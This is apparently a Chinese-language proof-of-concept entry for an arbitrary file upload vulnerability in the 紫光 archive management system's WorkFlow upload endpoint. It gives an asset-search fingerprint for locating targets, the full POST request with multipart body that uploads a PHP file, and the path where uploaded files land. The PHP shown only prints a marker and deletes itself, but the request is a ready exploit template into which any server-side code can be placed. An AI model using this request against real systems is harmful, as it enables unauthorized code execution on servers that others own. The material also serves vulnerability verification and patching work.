# 紫光档案管理系统WorkFlow存在任意文件上传漏洞

- **系统**：紫光档案管理系统　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app.name="紫光档案管理系统"`
- **请求**：`POST /System/WorkFlow/upload.html?token=5117e82385cef4c12547fdd4c028b97a1-1 HTTP/1.1`
- **关键头**：`Content-Length: 566`　`Content-Type: multipart/form-data; boundary=vow8ojiofbpypwih3t3i`

**请求体 / payload**
```
--vow8ojiofbpypwih3t3i
Content-Disposition: form-data; name="userID"
admin
--vow8ojiofbpypwih3t3i
Content-Disposition: form-data; name="fondsid"
1
--vow8ojiofbpypwih3t3i
Content-Disposition: form-data; name="comid"
1
--vow8ojiofbpypwih3t3i
Content-Disposition: form-data; name="token"
affe447f075bac53a7e568e833391e67
--vow8ojiofbpypwih3t3i
Content-Disposition: form-data; name="Filedata"; filename="wizjbifuta.php"
Content-Type: multipart/form-data
<?php echo "2ccASC47CJ474cqTBuzA0q6FCAS";unlink(__FILE__); ?>
--vow8ojiofbpypwih3t3i--

上传文件位置
GET /tmp/System/WorkFlow/import/20240220/65d41fbc77b27…（脚本共 670 字，完整版见原文）
```

**其他**
- 紫光档案管理系统WorkFlow存在任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 紫光档案管理系统